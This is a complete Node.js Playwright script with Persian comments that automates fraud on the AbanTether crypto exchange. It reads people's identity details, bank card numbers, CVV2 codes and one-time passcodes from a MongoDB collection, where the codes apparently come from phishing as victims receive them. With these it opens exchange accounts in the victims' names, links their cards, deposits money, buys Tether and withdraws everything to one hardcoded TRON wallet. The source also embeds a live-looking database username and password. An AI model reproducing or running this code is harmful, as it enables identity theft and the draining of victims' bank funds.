const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');

class AbanTetherBot {
    constructor() {
        // تنظیمات MongoDB
        this.mongoUri = 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority';
        this.dbName = 'ZarrinApp';
        this.collectionName = 'zarinapp';
        
        // تنظیمات سایت
        this.website = {
            baseUrl: 'https://abantether.com',
            registerUrl: 'https://abantether.com/register',
            timeout: 30000,
            headless: true
        };
        
        // تنظیمات تراکنش
        this.transaction = {
            depositAmount: '5000000',
            withdrawAddress: 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS',
            maxRetries: 3,
            retryDelay: 5000
        };
        
        this.mongoClient = null;
        this.db = null;
        this.collection = null;
        this.isRunning = true;
        this.processingUsers = new Set();
    }

    async initialize() {
        console.log('🚀 شروع ربات آبان تتر...');
        
        try {
            // اتصال به MongoDB
            this.mongoClient = new MongoClient(this.mongoUri);
            await this.mongoClient.connect();
            this.db = this.mongoClient.db(this.dbName);
            this.collection = this.db.collection(this.collectionName);
            console.log('✅ متصل به MongoDB');
        } catch (error) {
            console.error('❌ خطا در اتصال به MongoDB:', error);
            throw error;
        }
    }

    async startPolling() {
        console.log('🔄 شروع نظارت بر دیتابیس (هر 30 ثانیه)...');
        
        // اجرای اولیه
        await this.checkDatabase();
        
        // تنظیم تایمر برای چک هر 30 ثانیه
        setInterval(async () => {
            await this.checkDatabase();
        }, 30000);
    }

    async checkDatabase() {
        try {
            // جستجوی کاربران نیازمند پردازش
            const query = {
                $or: [
                    { otp_login: { $exists: true, $ne: null, $ne: '' } },
                    { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                    { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                ],
                processed: { $ne: true },
                status: { $ne: 'failed' },
                $or: [
                    { retryCount: { $exists: false } },
                    { retryCount: { $lt: this.transaction.maxRetries } }
                ]
            };

            const pendingUsers = await this.collection.find(query).limit(10).toArray();
            
            console.log(`📊 ${pendingUsers.length} کاربر نیازمند پردازش پیدا شد`);
            
            for (const user of pendingUsers) {
                // اگر کاربر در حال پردازش است، ردش کن
                if (this.processingUsers.has(user.personalPhoneNumber)) {
                    console.log(`⏭️ کاربر ${user.personalPhoneNumber} در حال پردازش است`);
                    continue;
                }
                
                // اگر تعداد تلاش‌ها بیش از حد مجاز است
                const retryCount = user.retryCount || 0;
                if (retryCount >= this.transaction.maxRetries) {
                    console.log(`⛔ کاربر ${user.personalPhoneNumber} بیش از حد تلاش کرده`);
                    await this.markUserFailed(user.personalPhoneNumber, 'تعداد تلاش‌ها بیش از حد مجاز');
                    continue;
                }
                
                // شروع پردازش
                this.processUser(user);
            }
        } catch (error) {
            console.error('❌ خطا در بررسی دیتابیس:', error);
        }
    }

    async processUser(user) {
        const phoneNumber = user.personalPhoneNumber;
        console.log(`👤 شروع پردازش کاربر: ${phoneNumber}`);
        
        // علامت‌گذاری کاربر به عنوان در حال پردازش
        this.processingUsers.add(phoneNumber);
        
        try {
            // آپدیت وضعیت به در حال پردازش
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                {
                    $set: {
                        status: 'processing',
                        startedAt: new Date(),
                        retryCount: (user.retryCount || 0)
                    },
                    $inc: { __v: 1 }
                }
            );
            
            // اجرای مراحل پردازش
            const result = await this.executeUserProcess(user);
            
            if (result.success) {
                console.log(`✅ کاربر ${phoneNumber} با موفقیت پردازش شد`);
                await this.markUserCompleted(phoneNumber, result.details);
            } else {
                console.log(`❌ خطا در پردازش کاربر ${phoneNumber}: ${result.error}`);
                await this.markUserFailed(phoneNumber, result.error, result.retry);
            }
            
        } catch (error) {
            console.error(`💥 خطای بحرانی در پردازش کاربر ${phoneNumber}:`, error);
            await this.markUserFailed(phoneNumber, `خطای بحرانی: ${error.message}`, true);
        } finally {
            // حذف کاربر از لیست در حال پردازش
            this.processingUsers.delete(phoneNumber);
        }
    }

    async executeUserProcess(user) {
        let browser = null;
        let page = null;
        
        try {
            // راه‌اندازی مرورگر
            browser = await chromium.launch({
                headless: this.website.headless,
                args: ['--no-sandbox', '--disable-setuid-sandbox']
            });
            
            const context = await browser.newContext({
                viewport: { width: 1280, height: 720 },
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            });
            
            page = await context.newPage();
            await page.setDefaultTimeout(this.website.timeout);
            
            console.log(`🌐 مرحله 1: ثبت‌نام برای ${user.personalPhoneNumber}`);
            await page.goto(this.website.registerUrl, { waitUntil: 'networkidle' });
            
            // وارد کردن شماره موبایل
            await this.smartFill(page, 'موبایل', user.personalPhoneNumber);
            await this.smartClick(page, 'ادامه');
            await page.waitForTimeout(2000);
            
            // انتظار برای OTP لاگین
            console.log('⏳ منتظر OTP لاگین...');
            const otpLogin = await this.waitForFieldInDatabase(user.personalPhoneNumber, 'otp_login');
            if (!otpLogin) {
                throw new Error('OTP لاگین دریافت نشد');
            }
            
            // وارد کردن OTP لاگین
            await this.enterOtp(page, otpLogin);
            await this.smartClick(page, 'تأیید');
            await page.waitForTimeout(3000);
            
            console.log('👤 مرحله 2: تکمیل اطلاعات هویتی');
            // پر کردن اطلاعات هویتی
            const personalInfo = [
                { field: 'نام', value: user.personalName },
                { field: 'کد ملی', value: user.personalNationalCode },
                { field: 'تاریخ تولد', value: user.personalBirthDate },
                { field: 'شهر', value: user.personalCity },
                { field: 'استان', value: user.personalProvince }
            ];
            
            for (const info of personalInfo) {
                await this.smartFill(page, info.field, info.value);
                await page.waitForTimeout(500);
            }
            
            await this.smartClick(page, 'تکمیل ثبت‌نام');
            await page.waitForTimeout(3000);
            
            console.log('💳 مرحله 3: ثبت کارت بانکی');
            // رفتن به کیف پول
            await this.smartClick(page, 'کیف پول');
            await page.waitForTimeout(2000);
            
            // کلیک بر ثبت کارت بانکی
            await this.smartClick(page, 'ثبت کارت');
            await this.smartClick(page, 'کارت بانکی');
            await page.waitForTimeout(2000);
            
            // پر کردن اطلاعات کارت
            const cardInfo = [
                { field: 'شماره کارت', value: user.cardNumber },
                { field: 'CVV2', value: user.cvv2 },
                { field: 'ماه', value: user.bankMonth.toString() },
                { field: 'سال', value: user.bankYear.toString() }
            ];
            
            for (const info of cardInfo) {
                await this.smartFill(page, info.field, info.value);
                await page.waitForTimeout(500);
            }
            
            await this.smartClick(page, 'ثبت');
            await page.waitForTimeout(2000);
            
            // انتظار برای OTP ثبت کارت
            console.log('⏳ منتظر OTP ثبت کارت...');
            const otpCard = await this.waitForFieldInDatabase(user.personalPhoneNumber, 'otp_register_card');
            if (!otpCard) {
                throw new Error('OTP ثبت کارت دریافت نشد');
            }
            
            // وارد کردن OTP ثبت کارت
            await this.enterOtp(page, otpCard);
            await this.smartClick(page, 'تأیید');
            await page.waitForTimeout(3000);
            
            console.log('💰 مرحله 4: واریز تومان');
            // رفتن به بخش واریز تومان
            await this.smartClick(page, 'واریز');
            await this.smartClick(page, 'تومان');
            await page.waitForTimeout(2000);
            
            // وارد کردن مبلغ
            await this.smartFill(page, 'مبلغ', this.transaction.depositAmount);
            await this.smartClick(page, 'پرداخت');
            await page.waitForTimeout(2000);
            
            // انتخاب درگاه کارت به کارت
            await this.smartClick(page, 'کارت به کارت');
            await page.waitForTimeout(2000);
            
            // انتظار برای OTP پرداخت
            console.log('⏳ منتظر OTP پرداخت...');
            const otpPayment = await this.waitForFieldInDatabase(user.personalPhoneNumber, 'otp_payment');
            if (!otpPayment) {
                throw new Error('OTP پرداخت دریافت نشد');
            }
            
            // وارد کردن OTP پرداخت
            await this.enterOtp(page, otpPayment);
            await this.smartClick(page, 'تأیید');
            await page.waitForTimeout(5000);
            
            console.log('🔄 مرحله 5: خرید تتر');
            // رفتن به بازار
            await this.smartClick(page, 'بازار');
            await page.waitForTimeout(2000);
            
            // انتخاب تتر
            await this.smartClick(page, 'تتر');
            await this.smartClick(page, 'خرید');
            await page.waitForTimeout(2000);
            
            // انتخاب همه موجودی
            await this.smartClick(page, 'همه موجودی');
            await this.smartClick(page, 'خرید');
            await this.smartClick(page, 'تأیید');
            await page.waitForTimeout(5000);
            
            console.log('📤 مرحله 6: برداشت تتر');
            // رفتن به برداشت
            await this.smartClick(page, 'برداشت');
            await page.waitForTimeout(2000);
            
            // وارد کردن آدرس کیف پول
            await this.smartFill(page, 'آدرس', this.transaction.withdrawAddress);
            
            // انتخاب همه موجودی
            await this.smartClick(page, 'همه موجودی');
            
            // برداشت
            await this.smartClick(page, 'برداشت');
            await this.smartClick(page, 'تأیید نهایی');
            await page.waitForTimeout(5000);
            
            return {
                success: true,
                details: {
                    stepsCompleted: ['register', 'profile', 'card', 'deposit', 'buy', 'withdraw'],
                    completedAt: new Date()
                }
            };
            
        } catch (error) {
            console.error('❌ خطا در اجرای فرآیند:', error);
            return {
                success: false,
                error: error.message,
                retry: true
            };
        } finally {
            if (page) await page.close();
            if (browser) await browser.close();
        }
    }

    async smartFill(page, labelText, value) {
        const selectors = [
            `input[placeholder*="${labelText}"]`,
            `input[name*="${labelText.toLowerCase()}"]`,
            `input[id*="${labelText.toLowerCase()}"]`,
            `label:has-text("${labelText}") + input`,
            `//label[contains(text(), '${labelText}')]/following::input[1]`,
            `text=${labelText} >> .. >> input`,
            `[aria-label*="${labelText}"]`
        ];
        
        for (const selector of selectors) {
            try {
                const element = await page.$(selector);
                if (element) {
                    await element.fill(value);
                    console.log(`✅ پر کردن ${labelText}: ${value}`);
                    await page.waitForTimeout(500);
                    return true;
                }
            } catch (error) {
                continue;
            }
        }
        
        // اگر با سلکتورهای بالا پیدا نشد، سعی می‌کنیم با XPath پیدا کنیم
        try {
            const xpath = `//*[contains(text(), '${labelText}')]/following::input[1]`;
            const element = await page.$(xpath);
            if (element) {
                await element.fill(value);
                return true;
            }
        } catch (error) {
            // continue
        }
        
        throw new Error(`فیلد "${labelText}" پیدا نشد`);
    }

    async smartClick(page, buttonText) {
        const selectors = [
            `button:has-text("${buttonText}")`,
            `a:has-text("${buttonText}")`,
            `//button[contains(text(), '${buttonText}')]`,
            `//a[contains(text(), '${buttonText}')]`,
            `[role="button"]:has-text("${buttonText}")`,
            `span:has-text("${buttonText}")`,
            `div:has-text("${buttonText}")`
        ];
        
        for (const selector of selectors) {
            try {
                const element = await page.$(selector);
                if (element && await element.isVisible()) {
                    await element.click();
                    console.log(`🖱️ کلیک بر: ${buttonText}`);
                    await page.waitForTimeout(1000);
                    return true;
                }
            } catch (error) {
                continue;
            }
        }
        
        // تلاش با XPath
        try {
            const xpath = `//*[contains(text(), '${buttonText}')]`;
            const elements = await page.$$(xpath);
            for (const element of elements) {
                if (await element.isVisible()) {
                    await element.click();
                    return true;
                }
            }
        } catch (error) {
            // continue
        }
        
        throw new Error(`دکمه "${buttonText}" پیدا نشد`);
    }

    async enterOtp(page, otp) {
        console.log(`🔢 وارد کردن OTP: ${otp}`);
        
        // روش 1: جستجوی همه فیلدهای OTP
        const otpInputs = await page.$$('input[type="tel"], input[type="number"], input[maxlength="1"]');
        
        if (otpInputs.length >= 5) {
            for (let i = 0; i < Math.min(otpInputs.length, 6); i++) {
                if (otp[i]) {
                    await otpInputs[i].fill(otp[i]);
                }
            }
            return true;
        }
        
        // روش 2: جستجوی فیلد تک‌
        const singleInput = await page.$('input[type="tel"][maxlength="6"], input[type="number"][maxlength="6"]');
        if (singleInput) {
            await singleInput.fill(otp);
            return true;
        }
        
        // روش 3: جستجو با XPath
        const xpath = '//input[@type="tel" or @type="number"]';
        const inputs = await page.$$(xpath);
        if (inputs.length > 0) {
            await inputs[0].fill(otp);
            return true;
        }
        
        throw new Error('فیلد OTP پیدا نشد');
    }

    async waitForFieldInDatabase(phoneNumber, fieldName, maxAttempts = 60) {
        console.log(`⏳ منتظر پر شدن ${fieldName} برای ${phoneNumber}...`);
        
        let attempts = 0;
        while (attempts < maxAttempts) {
            try {
                const user = await this.collection.findOne(
                    { personalPhoneNumber: phoneNumber },
                    { projection: { [fieldName]: 1 } }
                );
                
                if (user && user[fieldName] && user[fieldName].trim() !== '') {
                    console.log(`✅ ${fieldName} دریافت شد: ${user[fieldName]}`);
                    return user[fieldName];
                }
                
                attempts++;
                await new Promise(resolve => setTimeout(resolve, 1000)); // هر 1 ثانیه چک کن
                
            } catch (error) {
                console.error(`خطا در چک کردن ${fieldName}:`, error);
                await new Promise(resolve => setTimeout(resolve, 1000));
                attempts++;
            }
        }
        
        console.log(`⏰ زمان انتظار برای ${fieldName} به پایان رسید`);
        return null;
    }

    async markUserCompleted(phoneNumber, details = {}) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                {
                    $set: {
                        processed: true,
                        status: 'completed',
                        completedAt: new Date(),
                        ...details
                    },
                    $unset: {
                        otp_login: "",
                        otp_register_card: "",
                        otp_payment: ""
                    },
                    $inc: { __v: 1 }
                }
            );
            console.log(`✅ کاربر ${phoneNumber} به عنوان تکمیل‌شده علامت‌گذاری شد`);
        } catch (error) {
            console.error(`❌ خطا در علامت‌گذاری کاربر به عنوان تکمیل‌شده:`, error);
        }
    }

    async markUserFailed(phoneNumber, reason, shouldRetry = false) {
        try {
            const updateData = {
                $set: {
                    status: 'failed',
                    failureReason: reason,
                    failedAt: new Date()
                },
                $inc: { __v: 1 }
            };
            
            if (shouldRetry) {
                updateData.$inc.retryCount = 1;
            } else {
                updateData.$set.processed = true;
            }
            
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                updateData
            );
            
            console.log(`❌ کاربر ${phoneNumber} به عنوان ناموفق علامت‌گذاری شد: ${reason}`);
        } catch (error) {
            console.error(`❌ خطا در علامت‌گذاری کاربر به عنوان ناموفق:`, error);
        }
    }

    async cleanup() {
        console.log('🛑 پاکسازی منابع...');
        this.isRunning = false;
        
        if (this.mongoClient) {
            await this.mongoClient.close();
            console.log('✅ اتصال MongoDB بسته شد');
        }
    }
}

// مدیریت خطاهای غیرمنتظره
process.on('uncaughtException', (error) => {
    console.error('🔥 خطای غیرمنتظره:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🔥 خطای Reject نشده:', reason);
});

// اجرای اصلی
async function main() {
    const bot = new AbanTetherBot();
    
    try {
        await bot.initialize();
        await bot.startPolling();
        
        // مدیریت خاتمه برنامه
        process.on('SIGINT', async () => {
            console.log('\n🛑 دریافت سیگنال خاتمه...');
            await bot.cleanup();
            process.exit(0);
        });
        
        process.on('SIGTERM', async () => {
            console.log('\n🛑 دریافت سیگنال ترمینیت...');
            await bot.cleanup();
            process.exit(0);
        });
        
        console.log('🤖 ربات آماده کار است. Ctrl+C برای توقف.');
        
        // نگه داشتن برنامه در حال اجرا
        await new Promise(() => {});
        
    } catch (error) {
        console.error('💥 خطای بحرانی در اجرای ربات:', error);
        await bot.cleanup();
        process.exit(1);
    }
}

// اگر این فایل مستقیماً اجرا شود
if (require.main === module) {
    main();
}

module.exports = AbanTetherBot;